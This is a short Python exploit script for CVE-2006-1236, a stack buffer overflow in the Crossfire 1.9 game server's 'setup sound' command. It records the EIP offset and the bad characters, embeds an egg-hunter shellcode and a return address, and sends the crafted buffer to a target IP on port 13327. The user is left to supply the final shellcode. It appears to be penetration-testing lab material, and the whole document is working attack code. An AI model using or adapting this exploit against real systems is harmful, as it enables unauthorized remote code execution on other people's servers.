#!/usr/bin/python
# CVE-2006-1236
# Operating Systems Tested:
# 	Kali Linux 4.17.0 (x86)
# Bad characters: \x00\x0a\x0d\x20
# EIP Offset: 4368
import argparse
import socket

payload = ""

parser = argparse.ArgumentParser(description = "Crossfire 1.9 \"setup sound\" Exploit")
parser.add_argument("RHOST", help = "Target's IP Address")
arguments = parser.parse_args()
EIP = "\x1f\xc5\x13\x08"
egg_hunter = "\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x48\x41\x43\x4b\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7"
if len(payload) > 0:
	rhost = arguments.RHOST
	buffer = "\x11(setup sound " + "HACKHACK" + payload + "\x90" * (4368 - 8 - len(payload) - len(egg_hunter)) + egg_hunter + EIP + "\x90" * (4380 - 4368 - 4) + "\x00#"
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("[*] Connecting to " + rhost + " on port 13327")
	connection.connect((rhost,13327))
	print("[*] Sending exploit")
	connection.send(buffer)
	response = connection.recv(1024)
	connection.close()
	print("[*] Exploit had been sent")
else:
	print("[-] \"payload\" is empty. Please add your shellcode to the \"payload\" variable.")
